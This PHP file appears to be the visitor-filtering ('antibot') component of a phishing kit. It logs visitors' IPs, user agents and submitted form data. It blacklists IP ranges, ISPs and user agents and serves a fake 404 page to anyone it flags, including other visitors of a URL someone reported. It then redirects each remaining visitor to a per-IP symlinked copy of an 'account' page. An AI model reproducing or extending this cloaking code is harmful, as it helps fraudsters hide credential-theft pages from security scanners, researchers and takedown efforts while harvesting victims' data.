<?php
//session_start();
//include 'includes/config.php';
$intelligence = true;
$ip = getIp();
$isp = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$requestUrl = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$accessB4Ban = 1888899;//multiples of 2
$dst    = md5($ip);
//$_SESSION['dst'] = $dst; 
$src="account";
$intelFile = isset($intelligence) ? 'i.json' : 'i.json';
$intelFilePristine = isset($intelligence) ? 'i-pristine.json' : 'i-pristine.json';
//$protected_dirs = ['./','../'];
$artInt = json_decode(file_get_contents($intelFile));
if(!isset($artInt->ips->$ip)) $temp = new stdClass;
if(!isset($artInt->ips->$ip)) $temp->useragents = array();
if(!isset($artInt->ips->$ip)) $temp->pages_accessed = new stdClass;
if(!isset($artInt->ips->$ip)) $temp->pages_filled = new stdClass;
if(!isset($artInt->ips->$ip)) $temp->extra_data = array();
if(!isset($artInt->ips->$ip) && isset($_POST['system_time'])) $temp->extra_data[] = $_POST;
if(!isset($artInt->ips->$ip)) $artInt->ips->$ip = $temp;


function ban(){
	global $ip,$isp,$artInt,$requestUrl,$intelFile,$intelFilePristine;
	$pristineArtInt = json_decode(file_get_contents($intelFilePristine));
	if(in_array($ip, $artInt->blacklisted_ip_ranges))return;
	$artInt->blacklisted_ip_ranges[] = $ip;
	$pristineArtInt->blacklisted_ip_ranges[] = $ip;
	//also look for the reporter and blacklist also.
	if (!in_array($requestUrl, $artInt->blacklisted_links)) {
		foreach ((array)$artInt->ips as $eachIp => $ipData) {
			$pages_accessed = (array)$ipData->pages_accessed;
			if (in_array($requestUrl, array_values($pages_accessed)) && $ip!=$eachIp) {
				//add to bl
				$artInt->blacklisted_ip_ranges[] = $eachIp;
				$pristineArtInt->blacklisted_ip_ranges[] = $eachIp;
				//$artInt->blacklisted_links[] = $requestUrl;
				//$pristineArtInt->blacklisted_links[] = $requestUrl;
			}
		}
	}
	saveJson($artInt,$intelFile);
	saveJson($pristineArtInt,$intelFilePristine);
}

function drop($code){
	//if($_SERVER['HTTP_HOST']!='localhost')
	global $intelligence,$intelFile;
	ban();
	//$delDirectory = isset($intelligence) ? '../'.$_SESSION['dst'] : $_SESSION['dst'];
	//unlink($delDirectory);
	//echo "$code";
	header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    exit;
}

function runCheck(){
	global $ip,$isp,$ua,$artInt;
	//check ip range.
	$ip_parts = explode('.', $ip);
	if (in_array(implode('.', $ip_parts), $artInt->blacklisted_ip_ranges)) drop('0a');//whole
	array_pop($ip_parts);
	if (in_array(implode('.', $ip_parts), $artInt->blacklisted_ip_ranges)) drop('0b');//1st 3 parts
	array_pop($ip_parts);
	if (in_array(implode('.', $ip_parts), $artInt->blacklisted_ip_ranges)) drop('0c');//1st 2 parts
	//check isp
	foreach ($artInt->blacklisted_isp_strings as $bisp) {
		if(stripos($isp, $bisp)!==false) drop();
	}

	//check ua
	foreach ($artInt->blacklisted_user_agent_strings as $bua) {
		if(stripos($ua, $bua)!==false) drop();
	}
}

function logIt($method='posted'){
	global $ip,$isp,$ua,$artInt,$requestUrl,$intelFile;
	$time = date('h:i:sA d/F/Y');
	$artInt->ips->$ip->useragents[] = $ua;
	$artInt->ips->$ip->useragents = array_unique($artInt->ips->$ip->useragents);
	//add to pages filled if form was filled.
	if ($method!='posted' && !empty($_POST)) {
		$count = 0;
		foreach ($_POST as $key => $value) {
			if($value=='') $count += 1;
		}
		$grace = count($_POST) - 1;
		if($count <= $grace ) $artInt->ips->$ip->pages_filled->$time = $requestUrl;
	}
	$artInt->ips->$ip->pages_accessed->$time = ($method=='posted')?$_POST['page']:$requestUrl;
	//save data
	
	writeinfo($intelFile,json_encode($artInt),'w');
}

function observe($method='posted'){
	global $ip,$isp,$ua,$artInt,$accessB4Ban;
	$accessed = count((array)$artInt->ips->$ip->pages_accessed);
	$filled = count((array)$artInt->ips->$ip->pages_filled);
	$uniqueUserAgentCount = count($artInt->ips->$ip->useragents);//sleuth
	$extraData = count($artInt->ips->$ip->extra_data);
	$nagBan = $accessB4Ban * 2;
	if ($uniqueUserAgentCount>2) drop('ua');
	if ($extraData==0) drop('bot');
	if($accessed==0 && $filled==0 && $method=='posted' && $extraData!=0) return;
	if($accessed<$accessB4Ban && $filled==0 && $extraData!=0) return; 
	if($accessed>=$nagBan||$filled>=$nagBan) drop(1); //infinity filler
	if($accessed>$accessB4Ban) drop(2); //sleuth
	if($filled!=0 && $accessed/$filled>=$accessB4Ban) drop(3); //^^
	//if($accessed>=1 && $extraData==0 && $method!='posted' && !isset($_SESSION['real_user'])) drop(4); //^^
	//to-do ban anyone who accesses the root dir
}

//check if it was included.
if (isset($intelligence)) {
	//we were included.
	runCheck();
	logIt('included');
	//observe('included');
}else{
	//we must have been posted to
	if(empty($_POST)){ drop(5); }
	runCheck();
	logIt();
	//observe();
	symlink($src, $dst);
	header("location:".$dst."");
}